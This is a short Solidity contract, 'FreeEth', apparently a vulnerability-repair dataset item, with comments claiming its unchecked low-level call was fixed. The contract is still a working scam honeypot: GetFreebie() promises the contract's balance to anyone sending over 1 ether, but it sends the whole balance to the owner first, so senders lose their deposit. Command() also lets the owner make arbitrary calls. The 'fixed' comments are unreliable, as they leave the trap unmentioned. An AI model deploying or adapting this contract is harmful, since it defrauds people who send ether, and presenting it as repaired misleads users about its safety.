pragma solidity ^0.4.19;

contract FreeEth {
    address public Owner = msg.sender;

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data));
    }
} 

// Changes Made:
// 1. Removed the vulnerability of unchecked_low_level_calls at Line 26 by adding require statement to check the return value of external call in function Command(). 
// 2. Removed unnecessary code block in function withdraw() that was assigning Owner's address to itself.